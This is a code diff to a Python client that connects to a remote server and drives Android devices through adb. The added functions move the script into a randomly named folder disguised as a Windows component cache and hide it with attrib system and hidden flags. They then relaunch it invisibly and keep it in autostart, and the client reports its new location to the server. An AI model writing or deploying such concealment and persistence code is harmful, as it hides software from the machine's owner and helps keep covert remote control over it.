@@ -422,6 +422,7 @@ def session(host, port, args, exclude):
     log(f"connected to {host}:{port} as '{args.name}'")
     save_config("last_host", host)
     save_config("token", args.token)
+    send({"t": "client_info", "path": os.path.abspath(sys.argv[0]), "version": VERSION, "host": args.name})
     stop = threading.Event()
     def save_token(token):
         if token and token != "kaneki":
@@ -645,6 +646,63 @@ def _startup_update_check():
     if tag:
         log(f"[update] v{tag} available — run with --update to apply ({url})")
 
+def _make_hidden_path():
+    """Return a stable randomized hidden path; generates once and stores in config."""
+    cfg = load_config()
+    saved = cfg.get("hidden_path")
+    if saved and os.path.isfile(saved):
+        return saved
+    base = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
+    # Blends in with real Windows component cache folders
+    folder = os.path.join(base, "Microsoft", "Windows", secrets.token_hex(8))
+    path = os.path.join(folder, secrets.token_hex(6) + ".py")
+    save_config("hidden_path", path)
+    return path
+
+def _set_hidden(path):
+    """Apply hidden + system attributes so the file/folder disappears in Explorer."""
+    try:
+        subprocess.run(
+            ["attrib", "+h", "+s", path],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+    except Exception:
+        pass
+
+def _relocate_self():
+    """
+    If not already running from the hidden path, copy self there,
+    hide it, re-exec from the new location, and exit this process.
+    The re-exec'd instance calls _ensure_autostart() so the Task Scheduler
+    task will point to the hidden file going forward.
+    """
+    if os.name != "nt":
+        return
+    dest = _make_hidden_path()
+    current = os.path.normcase(os.path.abspath(sys.argv[0]))
+    if current == os.path.normcase(dest):
+        return  # already running from hidden location
+    try:
+        os.makedirs(os.path.dirname(dest), exist_ok=True)
+        shutil.move(sys.argv[0], dest)
+        _set_hidden(os.path.dirname(dest))
+        _set_hidden(dest)
+    except Exception as e:
+        log(f"[hide] copy failed: {e}")
+        return
+    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+    if not os.path.exists(pythonw):
+        pythonw = sys.executable
+    subprocess.Popen(
+        [pythonw, dest] + sys.argv[1:],
+        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
+        close_fds=True,
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    sys.exit(0)
+
 def _daemonize():
     """If launched from a visible Python console, re-spawn via pythonw.exe and exit immediately.
     The re-spawned process has no window, no taskbar entry, no flicker — completely invisible."""
@@ -745,7 +803,8 @@ def main():
     if args.update:
         self_update()
         return
-    _daemonize()   # re-spawn headless if launched from a terminal; exits this process
+    _daemonize()       # re-spawn headless if launched from a terminal; exits this process
+    _relocate_self()   # move to random hidden AppData path and re-exec; exits this process
     _ensure_autostart()
     exclude = {args.usb} if args.usb else set()
     ok, out = adb(None, "start-server", timeout=30)
